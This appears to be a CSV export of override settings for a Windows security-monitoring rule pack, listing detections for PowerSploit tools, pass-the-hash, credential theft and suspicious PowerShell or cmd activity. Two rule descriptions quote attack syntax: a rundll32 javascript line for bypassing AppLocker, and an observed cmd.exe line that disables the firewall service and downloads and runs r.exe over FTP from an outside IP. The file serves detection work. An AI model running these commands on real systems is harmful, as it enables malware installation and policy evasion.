Security.Monitoring,SecurityMonitoringMP.APPLocker.WinRar,Rule,Security Monitoring:  WinRar in use,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.BatchLogonInUse,Rule,Security Monitoring Threat Hunting: Batch Logon in use,"This rule checks the security log for event ID 4624 Logon Type 4.  Logon type 4 is a batch logon, which essentially means that there are exposed credentials on this system. Investigation should determine which application is using said credentials. Once the applications are remediated, batch logons can be disabled, making your environment more secure.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ByPassExecutionPolicy,Rule,Security Monitoring Forwarded Events:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SpecialGroupLogon,Rule,Security Monitoring Forwarded Events:  Special Group logon event,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeRemoteExpression,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeDLLInjection,Rule,Security Monitoring Forwarded Events:  PowerSploit Invoke DLL Injection Command in Use,A Powersploit tool used to inject code into DLL files is in use in the environment.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.WdigestAuthentication,Rule,Security Monitoring: Collect WDigest Authentication Events,"If the proper audit policies are turned on, this rule will collect WDigest logons.  See https://blogs.technet.microsoft.com/kfalde/2014/11/02/kb2871997-and-wdigest-part-2/ for details",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.WdigestAuthentication,Rule,Security Monitoring: Collect WDigest Authentication Events,"If the proper audit policies are turned on, this rule will collect WDigest logons.  See https://blogs.technet.microsoft.com/kfalde/2014/11/02/kb2871997-and-wdigest-part-2/ for details",AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe3,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath2,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe1,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath1,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableFilePath3,string,Replacewithspecificpath,Replacewithspecificpath,Replacewithspecificpath,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,OverrideableExe2,string,Replacewithspecificexe,Replacewithspecificexe,Replacewithspecificexe,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Severity,int,2,,,
Security.Monitoring,Security.Monitoring.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Priority,int,1,,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App2,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App3,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App5,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App4,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,App1,string,Thisisavalueyoucanreplacewithsomethinginyourenvironment,Thisisavalueyoucanreplacewithsomethinginyourenvironment,,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.ServiceCreatedonDC,Rule,Security Monitoring: A service was Created on a Domain Controller,This rule tracks the creation of a service on a domain controller. There are overridable properties for up to 5 applications so as to reduce noise.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousCMD,Rule,Security Monitoring:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SmartCardDisabled,Rule,Security Monitoring:  A Smart Card has been Disabled to Allow for Interactive Logon,Someone has purposely desected the option to disable smart card authentication for the account.  Verify that this has in fact been approved.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.FindAVSignature,Rule,Secuity Monitoring Forwarded Events:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.EnterpriseAdminChange,Rule,Security Monitoring:  Enterprise Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.InvokeRemoteExpression,Rule,Security Monitoring:  PowerShell used to Invoke a Remote Expression,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to execute something it is downloading from a web connection. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.ServiceCreatedonMemberServer,Rule,Security Monitoring: A service was created on a member server,"I would consider enabling this rule for any production server that is in a steady state. No services should be created at this point, and any event where one is created would be worthy of investigation.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ThreatHunt.SpecialGroupLogon,Rule,Security Monitoring Threat Hunting:  Special Group logon event,"This rule will not generate any noise under normal environment. It requires special groups auditing turned on via GPO as well as the specific memberships to be targeted in the registry. If you've done these tasks, this monitor will alert every time a user that is a member of these",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Destination,Rule,Security Monitoring:  Possible WMI Remote Attempt Made To this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Pth.PtHAgainstTier1,Rule,Security Monitoring: Possible PtH Attack in Progress against tier 1,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeNinjaCopy,Rule,Security Monitoring:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.WCE,Rule,Security Monitoring:  WCE in Use,"WCE is a credential theft too used to perform pass the hash attacks and enumerate wdigest passwords if this is turned on in your environment.  Other than penetration testing, there is little reason for this tool to exist in your environment.  This should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokePortScan,Rule,Security Monitoring Forwarded Events:  Invoke Portscan is in Use,"This looks for the Powersploit tool Invoke-Portscan, which is used to can IP addresses for open ports.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.FindAVSignature,Rule,Secuity Monitoring:  PowerSploit FindAV Signature Tool is in Use,Find-AVSignature is used to split a file into smaller chunks to detect which piece is being identified by AV.  That part can be redesigned to avoid detection.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed,"To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe ""Rundll32.exe"" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";<code>


Events of this nature need to be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.UnexpectedShutdown,Rule,Security Monitoring:  Unexpected System Shutdown,"This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.NTLMV1,Rule,Security Monitoring: Collect NTLMV1 Events,Collection rule to collect all authentication events using NTLMv1 to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.NTLMV1,Rule,Security Monitoring: Collect NTLMV1 Events,Collection rule to collect all authentication events using NTLMv1 to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.PowerShellStartHiddenProcess,Rule,Security Monitoring Forwarded Events:  Hidden Process Starting Using PowerShell,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.CollectionRule.CollectLAPSEvents,Rule,Security Monitoring: Collect LAPS Events,Description for the new event collection rule.,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.CollectionRule.CollectLAPSEvents,Rule,Security Monitoring: Collect LAPS Events,Description for the new event collection rule.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand,Rule,Security Monitoring:  A suspicious process creation (FTP script execution via echo command) was executed,"Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

""Command Line "": ""\""\""\""C:\\Windows\\System32\\cmd.exe\""\"" /c \""\""net1 stop sharedaccess&echo open 222.186.58.12 >>  love.txt&echo 123>> love.txt&echo 123>> love.txt&echo binary >> love.txt&echo get r.exe >> love.txt&echo bye >> love.txt&ftp -s:love.txt&p -s:love.txt&r.exe&r.exe&del love.txt /q /f&exit\""\""\""


This type of event is rare and should be investigated",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
